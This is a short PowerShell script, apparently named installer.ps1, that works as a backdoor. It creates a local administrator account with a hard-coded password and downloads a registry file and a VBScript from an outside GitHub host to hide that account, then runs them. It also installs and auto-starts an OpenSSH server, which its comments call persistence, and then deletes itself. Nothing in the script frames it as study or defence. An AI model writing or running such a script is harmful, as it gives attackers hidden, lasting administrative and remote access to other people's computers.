# random string for directory name
function random_text {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
}

# create local admin
function create_account {
    [CmdletBinding()]
    param (
        [string] $NewLocalAdmin,
        [securestring] $Password
    )
    begin {
    }
    process {
        New-LocalUser "$NewLocalAdmin" -Password $Password -FullName "$NewLocalAdmin" -Description "Temporary local admin" 
        Write-Verbose "$NewLocalAdmin local user craeted" 
        Add-LocalGroupMember -Group "Administrators" -Member "$NewLocalAdmin" 
        Write-Verbose "$NewLocalAdmin added to local administrators group"
    }
    end {

    }
}

# variables
$wd = random_text
$path = "$env:temp/$wd"
$initial_dir = Get-Location

# create admin user
$NewLocalAdmin = "winlocal"
$Password = (ConvertTo-SecureString "passkey6090" -AsPlainText -Force)
create_account -NewLocalAdmin $NewLocalAdmin -Password $Password

# goto temp, make working directory
mkdir $path
cd $path

# registry to hide local admin
Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/files/Registry.reg -OutFile "Registry.reg"

# visual basic script to register the registry
Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/files/confirm.vbs -OutFile "confirm.vbs"

#enabling persistence ssh
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'

# install the registry
./"Registry.reg"; ./"confirm.vbs"

# hide WindowsGuest user
#cd C:\Users
#attrib +h +s +r winlocal

# self delete
cd $initial_dir
del installer.ps1
